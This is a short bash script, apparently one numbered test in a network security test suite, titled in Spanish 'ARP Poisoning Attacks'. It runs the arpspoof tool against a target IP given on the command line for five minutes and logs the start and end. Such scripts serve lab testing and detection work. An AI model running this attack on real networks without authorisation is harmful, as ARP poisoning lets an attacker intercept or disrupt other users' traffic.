#!/usr/bin/env bash

TEST_NAME="1.1.4. Ataques de ARP Poisoning"
TEST_VERSION="1.0"

DATE_FORMAT="+%d/%m/%y %H:%M:%S"

ARPSPOOF_BIN=`which arpspoof`

TASK_LIFETIME=300
TASK_BREAKTIME=120


function banner () {
	echo "################################################################################"
	echo "# ${TEST_NAME} (${TEST_VERSION})"
	echo "################################################################################"
}


function estimate_time () {
	local life_etime=$(expr $TASK_LIFETIME \* 1)
	local break_etime=$(expr $TASK_BREAKTIME \* 0)
	local etime=$(expr $life_etime + $break_etime)
	etime=$(expr $etime \/ 60)
	echo "Estimated time: ${etime} minutes"
}


function usage () {
	echo "Usage:"
	echo "  ${0} <ip_target>"
}

function write_log () {
	local msg=$1
	local time=`date "$DATE_FORMAT"`
	echo "[${time}] ${msg}"
}

function exec_task () {
	local cmd=$1
	write_log "RUN: ${cmd}"
	$cmd &> /dev/null & 
}

function exec_task_timeout() {
	local cmd=$1
	local timeout=$2
	write_log "TASK START"
	exec_task "$cmd"
	local task_pid=$!
	echo "PID: $task_pid"
	{ sleep $timeout; kill -9 $task_pid; }	
	write_log "TASK END"
}

function run_test () {
	local ip_target=$1
	local cmd_base="${ARPSPOOF_BIN} ${ip_target}"
	echo "CMDBASE: ${cmd_base}"
	exec_task_timeout "$cmd_base" $TASK_LIFETIME
}

function main () {
	banner
	if [ $# -lt 1 ]; then
		usage
		exit 1
	else
		ip_target=$1
	fi

	estimate_time

	run_test $ip_target
}

main $1
